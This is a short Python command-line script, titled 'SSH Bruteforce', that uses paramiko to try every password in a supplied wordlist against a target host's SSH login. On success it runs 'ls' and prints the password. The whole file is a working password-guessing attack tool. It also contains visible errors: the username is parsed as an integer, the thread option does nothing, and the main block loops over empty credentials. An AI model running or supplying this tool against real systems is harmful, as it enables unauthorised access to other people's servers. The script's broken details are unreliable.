#!./env/bin/python3
import socket
import os
import sys
import random
import string
import argparse
import keyboard
import paramiko

# init option parser
parser = argparse.ArgumentParser(description='SSH Bruteforce')
parser.add_argument("-v", "--verbose", action='store_true', help='Verbose output')
parser.add_argument("-l", "--list", help='Wordlist for Attack', required=True)
parser.add_argument("-t", "--target", type=str, help='Target IP Adress', required=True)
parser.add_argument("-n", "--number", type=int, help='Number of threads', required=True)
parser.add_argument("-u", "--user", type=int, help='username for attack', required=True)
args = parser.parse_args()

def newTry(target,user,password):
    print("\nTrying: " + user + ":" + password)
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(target, username=user, password=password)
        _stdin, _stdout,_stderr = client.exec_command("ls")
        print(_stdout.read())
        client.close()
        return True
    except paramiko.AuthenticationException:
        print("[-] Wrong Password")
        return False

wordlist = open(args.list)
for pw in wordlist.readlines():
    pw = pw.strip()
    if newTry(args.target,args.user,pw):
        print("[+] Password found: " + pw)
        sys.exit(0)

# start here
if __name__ == "__main__":
    for i in range(args.number):
        newTry(args.target,"","")
        if keyboard.is_pressed('q'):
            print("Aborted by user.")
            break